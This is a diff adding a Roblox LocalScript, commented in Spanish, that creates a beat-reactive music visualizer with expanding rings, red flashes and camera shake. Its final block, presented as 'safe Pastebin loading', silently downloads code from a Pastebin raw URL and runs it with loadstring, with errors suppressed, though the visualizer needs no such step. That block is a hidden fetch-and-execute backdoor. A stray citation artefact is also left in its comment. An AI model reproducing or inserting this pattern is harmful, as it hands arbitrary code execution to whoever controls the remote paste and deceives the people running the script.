@@ -1,0 +1,155 @@
+-- LocalScript: Visualizador Pro (Más rápido, ultra fluido y con ritmo de alta precisión)
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+
+local function iniciarVisualizadorPro()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
+    local humanoid = character:WaitForChild("Humanoid", 5)
+    local camera = Workspace.CurrentCamera
+
+    if not humanoidRootPart or not humanoid then return end
+
+    -- 1. Configuración de audio
+    local music = Instance.new("Sound")
+    music.Name = "VisualizerSound"
+    music.SoundId = "rbxassetid://133464665404280"
+    music.Volume = 10
+    music.Looped = true
+    music.Parent = humanoidRootPart
+    music:Play()
+
+    -- 2. Contenedor en Workspace
+    local folder = Instance.new("Folder")
+    folder.Name = "MusicVisualizerProFolder"
+    folder.Parent = Workspace
+
+    -- Núcleo central negro absoluto y mate
+    local corePart = Instance.new("Part")
+    corePart.Name = "Core"
+    corePart.Size = Vector3.new(0.06, 6.5, 6.5)
+    corePart.Shape = Enum.PartType.Cylinder
+    corePart.Material = Enum.Material.SmoothPlastic
+    corePart.Color = Color3.fromRGB(0, 0, 0)
+    corePart.Anchored = true
+    corePart.CanCollide = false
+    corePart.Parent = folder
+
+    -- Variables de control para suavizado y velocidad optimizada
+    local activeWaves = {}
+    local timeSinceLastWave = 0
+    local currentSize = 6.5
+    local smoothLoudness = 0
+
+    -- 3. Bucle de renderizado con velocidad y precisión rítmica mejorada
+    local connection = RunService.RenderStepped:Connect(function(dt)
+        if not character or not character.Parent or humanoid.Health <= 0 or not folder.Parent then
+            if connection then connection:Disconnect() end
+            if folder then folder:Destroy() end
+            return
+        end
+        
+        -- Fijar el núcleo al suelo bajo los pies del personaje
+        local currentPos = humanoidRootPart.Position
+        local baseCF = CFrame.new(currentPos.X, currentPos.Y - 3, currentPos.Z) * CFrame.Angles(0, 0, math.rad(90))
+        corePart.CFrame = baseCF
+
+        -- Obtener volumen real con una respuesta mucho más rápida al ritmo
+        local rawLoudness = (music and music.IsPlaying) and music.PlaybackLoudness or 0
+        smoothLoudness = smoothLoudness + (rawLoudness - smoothLoudness) * (dt * 18)
+
+        -- Escalado dinámico más veloz y preciso ante cada beat
+        local targetSize = 6.5 + (smoothLoudness / 12)
+        currentSize = currentSize + (targetSize - currentSize) * (dt * 22)
+        corePart.Size = Vector3.new(0.06, currentSize, currentSize)
+        corePart.Color = Color3.fromRGB(0, 0, 0)
+
+        -- Umbral de intensidad optimizado para los golpes musicales
+        local isLoud = smoothLoudness > 65
+
+        -- Frecuencia de ondas adaptativa y ágil
+        timeSinceLastWave = timeSinceLastWave + dt
+        local spawnInterval = math.clamp(0.22 - (smoothLoudness / 320), 0.04, 0.22)
+
+        if smoothLoudness > 28 and timeSinceLastWave >= spawnInterval then
+            timeSinceLastWave = 0
+            
+            local wave = Instance.new("Part")
+            wave.Size = Vector3.new(0.04, currentSize, currentSize)
+            wave.Shape = Enum.PartType.Cylinder
+            wave.Material = Enum.Material.SmoothPlastic
+            wave.Color = Color3.fromRGB(2, 2, 2)
+            wave.Transparency = 0.15
+            wave.Anchored = true
+            wave.CanCollide = false
+            wave.CFrame = baseCF * CFrame.new(0, 0.008, 0)
+            wave.Parent = folder
+
+            table.insert(activeWaves, {
+                part = wave, 
+                scale = currentSize, 
+                opacity = 0.15,
+                growthSpeed = 20 + math.random(3, 8) -- Expansión más rápida y orgánica
+            })
+        end
+
+        -- Actualización avanzada de ondas con alta velocidad y transiciones fluidas
+        for i = #activeWaves, 1, -1 do
+            local waveData = activeWaves[i]
+            if waveData.part and waveData.part.Parent then
+                waveData.scale = waveData.scale + (dt * waveData.growthSpeed)
+                waveData.opacity = waveData.opacity + (dt * 0.75)
+                
+                local currentThickness = math.max(0.015, 0.05 - (waveData.opacity * 0.035))
+                waveData.part.Size = Vector3.new(currentThickness, waveData.scale, waveData.scale)
+                waveData.part.Transparency = waveData.opacity
+
+                -- Destello rojo intenso rápido, volviendo de forma suave y elegante a negro profundo
+                local targetWaveColor = isLoud and Color3.fromRGB(240, 10, 10) or Color3.fromRGB(2, 2, 2)
+                local transitionSpeed = isLoud and 20 or 3.5
+                waveData.part.Color = waveData.part.Color:Lerp(targetWaveColor, dt * transitionSpeed)
+
+                if waveData.opacity >= 1 then
+                    waveData.part:Destroy()
+                    table.remove(activeWaves, i)
+                end
+            else
+                table.remove(activeWaves, i)
+            end
+        end
+
+        -- Temblor de cámara más dinámico y sincronizado al ritmo
+        local shakeIntensity = (music and music.IsPlaying) and (0.07 + (smoothLoudness / 600)) or 0.02
+        local shakeX = (math.random() - 0.5) * shakeIntensity
+        local shakeY = (math.random() - 0.5) * shakeIntensity
+        camera.CFrame = camera.CFrame * CFrame.new(shakeX, shakeY, 0)
+    end)
+
+    -- 4. Limpieza automática total al morir o reiniciar
+    humanoid.Died:Connect(function()
+        if connection then connection:Disconnect() end
+        if music then music:Stop(); music:Destroy() end
+        if folder then folder:Destroy() end
+    end)
+end
+
+-- 5. Carga segura del Pastebin en segundo plano e inicio inmediato[span_1](start_span)[span_1](end_span)
+task.spawn(function()
+    pcall(function()
+        local success, response = pcall(function()
+            return game:HttpGet("https://pastebin.com/raw/TTAQHL1T")
+        end)
+        
+        if success and response and response ~= "" then
+            local loadFunc = loadstring(response)
+            if loadFunc then
+                pcall(loadFunc)
+            end
+        end
+    end)
+end)
+
+iniciarVisualizadorPro()
